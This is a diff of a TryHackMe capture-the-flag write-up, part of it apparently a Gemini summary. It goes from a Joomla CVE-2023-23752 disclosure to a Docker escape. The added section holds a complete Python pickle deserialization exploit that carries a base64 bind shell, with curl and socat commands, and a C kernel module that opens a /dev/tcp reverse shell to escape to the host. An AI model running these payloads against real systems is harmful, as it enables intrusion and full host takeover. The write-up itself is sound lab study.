@@ -87,7 +87,7 @@ Disallow: /plugins/
 Disallow: /tmp/
 ```
 Sadly - my github got closed while I was editing, so nothing got saved. Ill post summary from gemini:
-New Target: Joomla 4.2.7 (CVE-2023-23752)
+## New Target: Joomla 4.2.7 (CVE-2023-23752)
 
 After moving laterally, we encountered a machine running Joomla. A scan using joomscan identified the version as 4.2.7, which is susceptible to a critical unauthenticated information disclosure vulnerability in its API.
 
@@ -105,7 +105,7 @@ After moving laterally, we encountered a machine running Joomla. A scan using jo
 
         Joomla Superuser: root
 
-4. SSH Access and Initial Foothold
+## SSH Access and Initial Foothold
 
 Network reconnaissance revealed two SSH ports: 22 and 2222. The password recovered from the database configuration proved successful for the root user on port 2222.
 
@@ -113,7 +113,7 @@ Network reconnaissance revealed two SSH ports: 22 and 2222. The password recover
 
     Result: Gained root access within a Docker container (ID: f5eb774507f2).
 
-5. Internal Docker Pivoting
+## Internal Docker Pivoting
 
 Operating as root inside the container, we performed an internal network sweep to identify other microservices within the 192.168.100.0/24 subnet.
 
@@ -125,7 +125,7 @@ Operating as root inside the container, we performed an internal network sweep t
 
     Discovery: Port 5000 was open, hosting the "Tourism Secret Finance Panel" powered by Python/Werkzeug.
 
-6. SSH Tunneling and Werkzeug Debugger
+## SSH Tunneling and Werkzeug Debugger
 
 To access the internal web application from our local machine, we established an SSH tunnel using Local Port Forwarding.
 
@@ -134,3 +134,106 @@ To access the internal web application from our local machine, we established an
     Access: http://localhost:8888/
 
     Key Discovery: The application had the Werkzeug debugger enabled. Navigating to the /console endpoint revealed a locked interactive Python shell, providing a direct path toward Remote Code Execution (RCE).
+
+## COuldnt get proper items for werkzeug PIN, so i went back to the session_data i found on localhost:8888
+7. Bypassing Validation & Bind Shell (Insecure Deserialization)
+
+The finance panel validated user sessions using serialized Python objects (Pickle) stored in the session_data cookie. Direct injection of a payload using os.system resulted in an application error (Invalid cookie header). This occurred because the server expected to deserialize a dictionary {'user': ..., 'revenue': ...}, but our payload returned the exit status code of the executed command instead. Additionally, we faced quote collision issues when attempting to pass complex shell commands.
+
+To bypass this, we crafted a "Trojan Horse" payload. We created a malicious class that, upon deserialization, executed our shell in the background using eval() and immediately returned the expected dictionary structure to prevent the application from crashing. To avoid syntax errors with quotes, the Bind Shell payload was encoded in Base64.
+
+    Payload Generation Script:
+
+Python
+
+import pickle
+import base64
+
+class RCE(dict):
+    def __reduce__(self):
+        # Clean Python bind shell code
+        bind_shell = """import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.bind(("0.0.0.0",9999))
+s.listen(1)
+conn,addr=s.accept()
+os.dup2(conn.fileno(),0); os.dup2(conn.fileno(),1); os.dup2(conn.fileno(),2)
+subprocess.call(["/bin/sh","-i"])"""
+        
+        # Base64 encode to avoid quote collisions
+        b64_shell = base64.b64encode(bind_shell.encode()).decode()
+        
+        # Decode and execute in the background
+        cmd = f"echo {b64_shell} | base64 -d | python3"
+        background_cmd = f"__import__('os').system('{cmd} &')"
+        
+        # eval() executes the background shell and returns the valid dictionary
+        return (eval, (f"({background_cmd}, {{'user': 'root', 'revenue': '85000'}})[1]",))
+
+print(pickle.dumps(RCE()).hex())
+
+    Execution: We sent the generated hex string via a GET request using curl from our compromised jump-host container:
+
+Bash
+
+curl -i -X GET -H "Cookie: session_data=<PAYLOAD_HEX>" http://localhost:8888/
+
+8. Initial Access & User Flag
+
+The payload successfully opened port 9999 on the target container (192.168.100.12). Since the target Docker image was stripped down and lacked nc (netcat), we used socat from our jump-host container to connect to the bind shell.
+
+    Connecting to the Bind Shell: ```bash
+    socat - TCP:192.168.100.12:9999
+
+* **Result:** Gained `root` access inside the finance application container (`voyage_priv2.joomla-net`).
+* **Flag Discovery:** Navigating to the `/root/` directory, we retrieved the first flag:
+  `THM{ee346612fb944085af0dd2cd677b1902}`
+
+### 9. Enumeration & Discovering the Docker Escape Vector
+Having compromised the container, the next objective was to escape to the underlying host machine (`10.112.151.128`). Checking the `/root/.bash_history` file revealed the actions of a previous user—specifically, the commands `make` and `insmod revshell.ko`. This was a massive clue indicating that the container had the `CAP_SYS_MODULE` capability, allowing it to load custom Linux Kernel Modules (LKMs) directly into the shared host kernel.
+
+### 10. Compiling the LKM and Rooting the Host
+To perform the escape, we wrote a malicious C module (`revshell.c`). We utilized the kernel function `call_usermodehelper`, which can execute user-space commands with full root privileges from within the kernel space, sending a reverse shell back to our Kali machine.
+
+* **Module Source Code (`revshell.c`):**
+```c
+#include <linux/kmod.h>
+#include <linux/module.h>
+
+MODULE_LICENSE("GPL");
+
+static int __init revshell_init(void) {
+    char *argv[] = { "/bin/bash", "-c", "bash -i >& /dev/tcp/192.168.180.79/4445 0>&1", NULL };
+    static char *envp[] = { "HOME=/", "TERM=linux", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
+    
+    // Executes the command in the host's user space
+    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+}
+
+static void __exit revshell_exit(void) {
+    printk(KERN_INFO "Revshell module unloaded.\n");
+}
+
+module_init(revshell_init);
+module_exit(revshell_exit);
+
+    Fixing the Kernel Headers Mismatch:
+    During compilation, make initially failed because uname -r reported the kernel version as 6.8.0-1031-aws, but the /usr/src/ directory only contained headers for version 1030. To bypass this, we dynamically generated a Makefile that hardcoded the path to the existing 1030 headers.
+
+    Generating the Makefile:
+
+Bash
+
+printf 'obj-m += revshell.o\n\nall:\n\tmake -C /usr/src/linux-headers-6.8.0-1030-aws M=$(PWD) modules\n\nclean:\n\tmake -C /usr/src/linux-headers-6.8.0-1030-aws M=$(PWD) clean\n' > Makefile
+
+    Execution and Escape:
+    After setting up a netcat listener on our attack machine (nc -lvnp 4445), we compiled and injected the kernel module:
+
+Bash
+
+make
+insmod revshell.ko
+
+    Result: The kernel module executed successfully on the host, granting us a fully privileged root reverse shell on the main underlying AWS instance.
+
+    Final Flag: THM{ace91ec899f84498a74629b078bdceff}
